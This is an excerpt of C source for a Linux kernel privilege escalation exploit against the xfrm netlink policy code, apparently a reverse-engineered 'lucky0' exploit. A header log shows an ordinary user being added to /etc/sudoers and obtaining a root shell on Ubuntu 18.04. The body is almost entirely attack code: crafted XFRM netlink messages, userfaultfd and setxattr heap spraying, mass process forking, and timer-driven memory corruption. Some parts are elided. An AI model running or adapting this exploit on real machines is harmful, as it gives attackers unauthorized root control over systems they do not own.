/* https://github.com/riskeco/Lucky/blob/master/lucky0_RE.c
 * Tested on Ubuntu 18.04
 * john@ubuntu:~/Desktop/cve$ uname -a
 * Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 * john@ubuntu:~/Desktop/cve$ id
 * uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
 * john@ubuntu:~/Desktop/cve$ gcc -static -pthread ./exp.c -o ./exp
 * /tmp/cc4XzDTC.o: In function `get_root':
 * exp.c:(.text+0xa0f): warning: Using 'getpwuid' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
 * john@ubuntu:~/Desktop/cve$ while true; do ./exp && break; done
 * [-] failed
 * [-] failed
 * [-] failed
 * [-] failed
 ...
 * [-] failed
 * running get_root
 * [+] current user john was added to /etc/sudoers
 * [+] get_root done
 * john@ubuntu:~/Desktop/cve$ sudo -s
 * root@ubuntu:~/Desktop/cve# id
...
// bind_on_cpu() —— run on single core
...
static void __xfrm_hash_rebuild(void)               	// msghdr -> iovec -> nlmsghdr(d0) + nlattr(d1) + xfrmu_spdhthresh(d2)
{
    ...
    d0->nlmsg_len = len;
    d0->nlmsg_type = XFRM_MSG_NEWSPDINFO;                   // 0x24
    d0->nlmsg_flags = NLM_F_REQUEST | NLM_F_MULTI;          // It is request message,  Multipart message, terminated by NLMSG_DONE
    d0->nlmsg_seq = 0;
    d0->nlmsg_pid = 0;
...
static void __xfrm_flush_policy0(void)
{
    ...
    nlm.nlmsg_flags = 1;                        // NLM_F_REQUEST
    nlm.nlmsg_seq = 0;
    nlm.nlmsg_pid = 0;
...
static void __xfrm_add_policy0(void)	// msghdr -> iovec -> nlmsghdr
{
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (fd == -1) {
        perror("socket");
    ...
    d0->nlmsg_len = len;
    d0->nlmsg_type = XFRM_MSG_NEWPOLICY;                        // 0x13
    d0->nlmsg_flags = NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL;    // It is request message, Create if it does not exist, Do not touch if it exists
    ...
    */
    ...
    d1->sel.saddr.a6[1] = 0;
    d1->sel.saddr.a6[2] = 0;
    d1->sel.saddr.a6[3] = 0xAA000000;                           // index = dir = 0
...
static void __xfrm_add_policy1(void)
{
    ...
    d0->nlmsg_len = len;
    d0->nlmsg_type = XFRM_MSG_UPDPOLICY;                // 0x19
    d0->nlmsg_flags = NLM_F_REQUEST;                    // It is request message.

    d1->sel.family = AF_INET6;
    
    d1->lft.soft_add_expires_seconds = 7;               // !!!!!!!!!! timer = 7s
    d1->lft.hard_add_expires_seconds = 7;
    d1->priority = 1;
    d1->index = 0x6e6bbc;                               // index = 0xc = 1100, dir = 0
    d1->action = 1;
...
static void *uffd_spray_handler(void *arg)
{
    ...
    while (1) {
        ...
        int c;
        read(wait_for_bug[0], &c, 1);                   // blocked by wait_for_bug[]
        ...
        io_copy.len = 0x1000;
        io_copy.mode = 0;
        if ((idx > (SEM_MAX - 1)) || (idx < 205)) {                 // process 0~0xcd: sleep(1)
            sleep(1);
            if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0)
                perror("UFFDIO_COPY");
        } else if ((ioctl(fd, UFFDIO_COPY, &io_copy)) != 0) {       // process 0xcd~300: not sleep()
            perror("UFFDIO_COPY");
        }
        sleep(3);
        break;
...
static pthread_t spray_setxattr(int flag, int idx)
{
    ...
    if (flag) {
        int c;
        read(wait_for_pol0[0], &c, 1);                      // (1) process 0xf9~300: blocked by wait_for_pol0[] before setxattr()
    }
...
int main(int argc, char *argv[])
{
    ...
    int err;
    err = ioctl(fd, NS_GET_USERNS);                                 // identified with strace   ioctl(fd, 0xb701)    ioctl(fd, NS_GET_USERNS)
    if (err < 0) {
        global_6031cc = 1;
    }
// bind on CPU 0
    bind_on_cpu(0);
// gain share memory —— shmaddr() + shmat()   用作同步信号量，调用sem_wait()和sem_post(), 前者减1，后者加1
    key = ftok("/dev/null", 5);
    shmid = shmget(key, 0x25a0, IPC_CREAT|0644);    // a. shmget(key_t key, size_t size, int shmflg)——得到一个共享内存标识符或创建一个共享内存对象  shmget(key, 0x25a0, 0x3a4)  shmget(key, 0x25a0, IPC_CREAT|0644)
    if (shmid < 0) {
        perror("shmget");
        exit(-1);
    }

    shmaddr = (sem_t *)shmat(shmid, 0, 0);          // b. void *shmat(int shmid, const void *shmaddr, int shmflg)——把共享内存区对象映射到调用进程的地址空间

    for (int i = 0; i < SEM_MAX; i++) {             // 300
    ...
    orig_gid = getgid();
// 1. child process: heap spray
    for (int i = 0; i < SUBP_MAX; i++) {            // 一次产生 2000 个子进程
        pid[i] = fork();
        if (pid[i])
            continue;
        /* child process */
...
// 1-1. heap spray
        if ((i > 0xf9) && (i < SEM_MAX)) {          // (1) process 0xf9~300: blocked by wait_for_pol0[]  before setxattr()
            spray_setxattr(1, i);
            sleep(5);
            exit(0);
        } else if (i <= 0xf9) {                     // (2) process 0~0xf9: not blocked
            spray_setxattr(0, i);
            sleep(5);
            exit(0);
        }
// 1-2. set gid and get root                        // (3) process 300~2000: wait 8>7s
        sleep(8);
        ...
        sleep(5);
        if (!global_6031cc) {
            if (ioctl(tmpfd, NS_GET_USERNS) < 0) {          // ioctl(tmpfd, 0xb701)   ioctl(tmpfd, NS_GET_USERNS)
                alarm(0);
                exit(2);
            }
        }
...
// 2-2. add policy 1
    sleep(1);
    __xfrm_add_policy1();
// 2-3. rehash, move policy 0 to bydst
    __xfrm_hash_rebuild();
...
// 2-4. unlink policy 0
    ...
    close(wait_for_bug[1]);
// 2-5. timer expires and trigger 8 bytes NULL write
    int status = -1;
    ...
    shmctl(shmid, 0, 0);                            // c. shmctl(int shmid, int cmd, struct shmid_ds *buf)——完成对共享内存的控制   IPC_RMID=0 删除这片共享内存
    shmdt(shmaddr);                                 // d. shmdt(const void *shmaddr)——断开共享内存连接
    if (status == -1) {
